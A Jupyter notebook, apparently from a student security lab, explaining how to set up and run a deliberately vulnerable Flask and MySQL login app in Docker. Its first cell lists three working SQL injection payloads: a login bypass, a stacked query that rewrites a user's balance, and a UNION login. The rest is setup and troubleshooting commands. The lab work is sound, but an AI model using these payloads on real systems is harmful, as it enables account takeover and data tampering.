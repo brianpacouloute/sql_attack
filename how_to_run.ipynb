{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## **SQL Injection Examples**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "bash"
    }
   },
   "outputs": [],
   "source": [
    "'OR'1'='1' -- # will log you into the first valid account in the database\n",
    "admin' OR 1=1; UPDATE users SET balance = 60000 WHERE username = 'Brian'; -- # will log you into the admin account and set Brian's balance to 60000\n",
    "brian' UNION SELECT * FROM users WHERE username='brian' -- # will log you into Brian's account"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## **First Setup**\n",
    "#### **Introduction**\n",
    "We are running a flask web application with **mysql in docker** inside a **virtual_environment**. Below is the initial setup process.\n",
    "\n",
    "#### **Step 1: Install Required Packages**\n",
    "The first thing we need to do is install the required packages. Run the below line in the vs code terminal."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "bash"
    }
   },
   "outputs": [],
   "source": [
    "sudo apt update && sudo apt install -y docker.io python3-venv python3-pip libmysqlclient-dev"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### **Step 2: Activate Virtual Environment**\n",
    "Now we use a virtual environment since we don't want everything we install to edit the system wide python installation. Activate the environment using the below line in the vs code terminal."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "bash"
    }
   },
   "outputs": [],
   "source": [
    "source venv/bin/activate"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Once activated, we can install flask pymysql. Thus ensuring Flask and PyMySQL are installed only for this project."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "bash"
    }
   },
   "outputs": [],
   "source": [
    "pip install flask mysqlclient bcrypt\n",
    "\n",
    "# or (if the above doesnt work)\n",
    "\n",
    "sudo apt install -y libmysqlclient-dev\n",
    "pip install flask mysqlclient bcrypt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To exit the virtual environment, run the below line."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "bash"
    }
   },
   "outputs": [],
   "source": [
    "deactivate"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## **Continuous Startup**\n",
    "### **Step 1: Enter the virtual environment**\n",
    "Use the below line to enter the virtual environment."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "bash"
    }
   },
   "outputs": [],
   "source": [
    "source venv/bin/activate"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### **Step 2: Run the container**\n",
    "Now inside the environment you have to run the containers making the database accessible."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "bash"
    }
   },
   "outputs": [],
   "source": [
    "sudo docker-compose up # this will show logs\n",
    "# or \n",
    "sudo docker-compose up -d # this will run in background and wont show as much out put as the regular one"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now before we access the website we need to make sure all the containers are up and running this means performing the below command and ensuring all containers are marked as Up."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "bash"
    }
   },
   "outputs": [],
   "source": [
    "sudo docker ps # to see the running containers\n",
    "# if the container is not running run the following command\n",
    "sudo docker start vulnerable-mysql # this will start the vulnerable-mysqsl mysql container "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that the container is up you can run the python script with the line below. This will in most cases give you a popup on the bottom right of your screen prompting you to open the website. If it doesn't connect using this [link](http://localhost:5000/)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "bash"
    }
   },
   "outputs": [],
   "source": [
    "python3 app.py"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now if you want to view the database on the terminal run the line below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "bash"
    }
   },
   "outputs": [],
   "source": [
    "sudo docker exec -it vulnerable-mysql mysql -u root -p # this will allow you to connect to the mysql container\n",
    "# password: password"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## **Common Errors** ( i came across)\n",
    "Sometimes when running the python script app.py you may run into the below error."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "bash"
    }
   },
   "outputs": [],
   "source": [
    "(venv) brian@Dark:~/cp400s_computer_security/sql_injection_attack$ python3 app.py\n",
    " * Serving Flask app 'app'\n",
    " * Debug mode: on\n",
    "Address already in use\n",
    "Port 5000 is in use by another program..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To fix this problem you have to kill the processes running on port 5000. To list the processes on port 5000 run the line below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "bash"
    }
   },
   "outputs": [],
   "source": [
    "sudo lsof -i :5000"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The output will look something like this:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "plaintext"
    }
   },
   "outputs": [],
   "source": [
    "COMMAND    PID  USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME\n",
    "python3 141877 brian    3u  IPv4 2047916      0t0  TCP *:5000 (LISTEN)\n",
    "python3 141883 brian    3u  IPv4 2047916      0t0  TCP *:5000 (LISTEN)\n",
    "python3 141883 brian    4u  IPv4 2047916      0t0  TCP *:5000 (LISTEN)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Kill the processes using the line below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "bash"
    }
   },
   "outputs": [],
   "source": [
    "sudo kill -9 <PID>"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
